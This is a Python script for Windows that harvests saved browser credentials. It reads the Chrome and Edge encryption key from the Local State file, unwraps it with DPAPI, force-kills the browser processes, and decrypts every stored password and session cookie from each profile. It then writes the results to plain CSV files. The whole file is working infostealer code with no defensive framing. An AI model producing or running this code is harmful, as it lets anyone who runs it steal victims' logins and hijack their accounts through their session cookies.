import os
import re
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta

class browser:
    def __init__(self):
        self.homepath = os.environ['USERPROFILE']+r"\AppData\Local"
        self.browsers=[
                       ["chrome.exe",self.homepath + r"\Google\Chrome\User Data"],
                       ["msedge.exe",self.homepath + r"\Microsoft\Edge\User Data"],
                    ]
        for i in self.browsers:
            if not os.path.exists(i[1]):
                self.browsers.remove(i)
            else:
                i.append(self.GetAESKey(i[1] + r"\Local State"))
    
    def GetAESKey(self,local_state_path):
        try:
            with open( local_state_path, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None

    def DecryptData(self, secret_key,iv,encrypted_data):
        try:
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_data)
            decrypted_pass = decrypted_pass.decode() 
            return decrypted_pass
        except Exception as e:
            return ""
        
    def GetDBConnection(self,chrome_path,filename):
        try:
            shutil.copy2(chrome_path,filename ) 
            abc=sqlite3.connect(filename)
            return abc
        except Exception as e:
            return None
    
    def GetPasswords(self):
        passwords = []
        for browser_name,browser_path,secret_key in self.browsers:
            try:
                folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
                    self.KillBrowser(browser_name)
                    conn = self.GetDBConnection(chrome_path_login_db,"Loginvault.db")
                    if(secret_key and conn):
                        print(secret_key)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(username!="" and ciphertext!=""):
                                decrypted_password = self.DecryptData(secret_key,ciphertext[3:15],ciphertext[15:-16])
                                passwords.append([browser_name,url, username, decrypted_password])
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
                    else:
                        return "[-][ERR] Unable to get secret key or database connection"
            except Exception as e:
                return "[-][ERR] %s"%str(e)
        return passwords
    
    def GetDatetime(self,chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""
    
    def KillBrowser(self,browser_name):
        try:
            os.system("taskkill /f /im %s"%browser_name)
        except Exception as e:
            print( "[-][ERR] %s"%str(e))
        
    
    def GetCookies(self):
        cookies = []
        for browser_name,browser_path,secret_key in self.browsers:
            try:
                folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                print(folders)
                for folder in folders:
                    cookie_db = os.path.normpath(r"%s\%s\Network\Cookies"%(browser_path,folder))
                    self.KillBrowser(browser_name)
                    conn = self.GetDBConnection(cookie_db,"Cookies.db")
                    if(conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                            if not value:
                                decrypted_value = self.DecryptData(secret_key, encrypted_value[3:15], encrypted_value[15:-16])
                            else:
                                decrypted_value = value
                            creation_utc = str(self.GetDatetime(creation_utc))
                            last_access_utc = str(self.GetDatetime(last_access_utc))
                            expires_utc = str(self.GetDatetime(expires_utc))
                            print(f"host_key: {host_key}, name: {name}, decrypted_value: {decrypted_value}, creation_utc: {creation_utc}, last_access_utc: {last_access_utc}, expires_utc: {expires_utc}")
                            cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                        cursor.close()
                        conn.close()
                        os.remove("Cookies.db")
                    else:
                        return "[-][ERR] Unable to get database connection"
            except Exception as e:
                return "[-][ERR] %s"%str(e)
        return cookies

import pandas as pd
def create_password_csv():
    browser_obj = browser()
    passwords = browser_obj.GetPasswords()
    if type(passwords) == str:
        return passwords
    df = pd.DataFrame(passwords, columns=["Browser", "URL", "Username", "Password"])
    df.to_csv("passwords.csv", index=False)
    return "Password file created successfully"

def create_cookies_csv():
    browser_obj = browser()
    cookies = browser_obj.GetCookies()
    if type(cookies) == str:
        return cookies
    df = pd.DataFrame(cookies, columns=["Browser", "Host Key", "Name", "Value", "Creation UTC", "Last Access UTC", "Expires UTC"])
    df.to_csv("cookies.csv", index=False)
    return "Cookies file created successfully"

print(create_password_csv())
print(create_cookies_csv())